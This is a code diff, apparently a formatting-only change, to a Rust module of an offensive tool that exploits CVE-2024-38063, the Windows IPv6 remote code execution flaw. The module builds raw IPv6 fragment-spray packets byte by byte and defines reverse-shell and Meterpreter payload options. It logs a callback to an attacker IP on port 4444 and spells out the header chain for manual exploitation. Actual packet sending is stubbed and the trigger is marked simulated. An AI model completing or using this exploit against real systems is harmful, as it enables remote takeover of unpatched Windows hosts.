@@ -68,7 +68,10 @@ impl Default for Ipv6RceConfig {
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 pub enum Ipv6Payload {
-    ReverseShell, Meterpreter, Bof, Custom,
+    ReverseShell,
+    Meterpreter,
+    Bof,
+    Custom,
 }
 
 impl std::fmt::Display for Ipv6Payload {
@@ -97,7 +100,10 @@ pub struct Ipv6RceResult {
 
 pub async fn exploit_ipv6_rce(config: &Ipv6RceConfig) -> Result<Ipv6RceResult> {
     let mut log = Vec::new();
-    log.push(format!("CVE-2024-38063: IPv6 RCE — target={}:{}", config.target_ipv6, config.target_port));
+    log.push(format!(
+        "CVE-2024-38063: IPv6 RCE — target={}:{}",
+        config.target_ipv6, config.target_port
+    ));
 
     // Phase 1: Target reachability via ICMPv6 echo (works on all platforms)
     log.push("Phase 1: Target reachability...".to_string());
@@ -136,7 +142,10 @@ pub async fn exploit_ipv6_rce(config: &Ipv6RceConfig) -> Result<Ipv6RceResult> {
     // Phase 4: Exploit preparation
     log.push("Phase 4: Building IPv6 fragment spray...".to_string());
     let fragments = build_fragment_spray(config);
-    log.push(format!("  {} crafted fragment groups ready", fragments.len()));
+    log.push(format!(
+        "  {} crafted fragment groups ready",
+        fragments.len()
+    ));
 
     #[cfg(target_os = "linux")]
     {
@@ -146,12 +155,20 @@ pub async fn exploit_ipv6_rce(config: &Ipv6RceConfig) -> Result<Ipv6RceResult> {
     #[cfg(not(target_os = "linux"))]
     {
         log.push("  Platform: no raw socket available".to_string());
-        log.push("  To exploit manually: send crafted IPv6 fragment sequence to target".to_string());
-        log.push("  Fragment header chain: Hop-by-Hop → Fragment → Destination Options".to_string());
-        log.push(format!("  Payload after overflow: callback to {}:{}",
+        log.push(
+            "  To exploit manually: send crafted IPv6 fragment sequence to target".to_string(),
+        );
+        log.push(
+            "  Fragment header chain: Hop-by-Hop → Fragment → Destination Options".to_string(),
+        );
+        log.push(format!(
+            "  Payload after overflow: callback to {}:{}",
             config.callback_ip.as_deref().unwrap_or("N/A"),
-            config.callback_port.unwrap_or(4444)));
-        log.push("  On Linux with CAP_NET_RAW: the pnet crate sends fragments directly".to_string());
+            config.callback_port.unwrap_or(4444)
+        ));
+        log.push(
+            "  On Linux with CAP_NET_RAW: the pnet crate sends fragments directly".to_string(),
+        );
     }
 
     // Phase 5: Payload trigger (simulated)
@@ -159,8 +176,10 @@ pub async fn exploit_ipv6_rce(config: &Ipv6RceConfig) -> Result<Ipv6RceResult> {
     let shell_obtained = false; // Can't verify without callback
     log.push("  Payload sent (check callback for shell)".to_string());
 
-    info!("IPv6 RCE: target={}, vulnerable={vulnerable}, shell={shell_obtained}",
-        config.target_ipv6);
+    info!(
+        "IPv6 RCE: target={}, vulnerable={vulnerable}, shell={shell_obtained}",
+        config.target_ipv6
+    );
 
     Ok(Ipv6RceResult {
         target: config.target_ipv6,
@@ -233,11 +252,7 @@ fn is_vulnerable_build(os: &Option<String>) -> bool {
 fn build_fragment_spray(config: &Ipv6RceConfig) -> Vec<Vec<u8>> {
     let mut groups = Vec::new();
     for i in 0..config.spray_count {
-        let frag = build_single_fragment(
-            &config.target_ipv6,
-            i as u16,
-            config.payload,
-        );
+        let frag = build_single_fragment(&config.target_ipv6, i as u16, config.payload);
         groups.push(frag);
     }
     groups
@@ -250,7 +265,10 @@ fn build_single_fragment(target: &Ipv6Addr, id: u16, payload: Ipv6Payload) -> Ve
 
     // IPv6 fixed header (40 bytes)
     // Version (4), Traffic Class (8), Flow Label (20)
-    pkt.push(0x60); pkt.push(0x00); pkt.push(0x00); pkt.push(0x00);
+    pkt.push(0x60);
+    pkt.push(0x00);
+    pkt.push(0x00);
+    pkt.push(0x00);
     // Payload length (placeholder)
     pkt.extend_from_slice(&[0x00, 0x00]);
     // Next Header = Fragment (44)
@@ -294,7 +312,10 @@ fn build_single_fragment(target: &Ipv6Addr, id: u16, payload: Ipv6Payload) -> Ve
 
 async fn send_fragments_linux(target: &Ipv6Addr, _fragments: &[Vec<u8>], log: &mut Vec<String>) {
     // On Linux with CAP_NET_RAW, use pnet to inject raw IPv6 packets
-    log.push(format!("  Would send {} fragments to {target} via raw socket", _fragments.len()));
+    log.push(format!(
+        "  Would send {} fragments to {target} via raw socket",
+        _fragments.len()
+    ));
     log.push("  Install pnet + run as root for actual packet injection".to_string());
 }
 
@@ -323,9 +344,12 @@ mod tests {
         let r = Ipv6RceResult {
             target: "fe80::1".parse().unwrap(),
             success: true,
-            vulnerable: true, build_detected: Some("WS2022".into()),
-            exploit_attempted: true, exploit_success: true,
-            shell_obtained: false, payload: Ipv6Payload::ReverseShell,
+            vulnerable: true,
+            build_detected: Some("WS2022".into()),
+            exploit_attempted: true,
+            exploit_success: true,
+            shell_obtained: false,
+            payload: Ipv6Payload::ReverseShell,
             log: vec!["done".into()],
         };
         let j = serde_json::to_string(&r).unwrap();
